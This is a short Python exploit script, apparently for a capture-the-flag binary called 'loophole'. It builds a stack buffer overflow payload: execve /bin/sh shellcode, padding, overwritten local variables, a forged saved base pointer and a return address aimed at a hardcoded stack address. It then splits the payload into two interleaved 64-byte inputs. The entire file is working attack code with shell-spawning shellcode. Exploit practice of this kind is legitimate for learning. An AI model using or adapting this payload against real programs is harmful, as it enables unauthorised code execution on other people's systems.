import struct
import sys
import subprocess

f = open("res.txt", "w")
cmd = ["./loophole"]
# proc = subprocess.Popen(
#     cmd, bufsize=300, stdout=subprocess.PIPE, stdin=subprocess.PIPE)


# inpt = input()
# f.write("recv: {}\n".format(inpt))
# hex_val = int(inpt.rstrip()[18:], 0)
hex_val = 0x7fffffffe8f0
f.write("byte_str: {}\n".format(hex_val))

# shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

byte2_offset = 84
i_offset = 0x5c
rip_offset = 0x68

byte1 = b""
byte2 = b""

fullpayload = shellcode
fullpayload += b"\xff" * (byte2_offset - len(shellcode))

# make sure to reset byte1/2
fullpayload += b"\x40\x00\x00\x00"
fullpayload += b"\x40\x00\x00\x00"

# set i to correct index
fullpayload += b"\x92\x00\x00\x00"

# correct rbp
fullpayload += struct.pack("Q", hex_val + 112)

# rip addr
fullpayload += struct.pack("Q", hex_val)
fullpayload += b"\x00" * (128 - len(fullpayload))


for i in range(len(fullpayload)):
    if i % 2 == 0:
        byte1 += fullpayload[i].to_bytes(1, "little")
    else:
        byte2 += fullpayload[i].to_bytes(1, "little")

byte1 += b"\xff" * (64 - len(byte1))
byte2 += b"\xff" * (64 - len(byte2))

f.write("full payload: {}\n".format(fullpayload))
f.write("send byte1: {}, len: {}\n".format(byte1, len(byte1)))
f.write("send byte2: {}, len: {}\n".format(byte2, len(byte2)))
print("byte1: {}".format(byte1))
print("byte2: {}".format(byte2))

f.close()
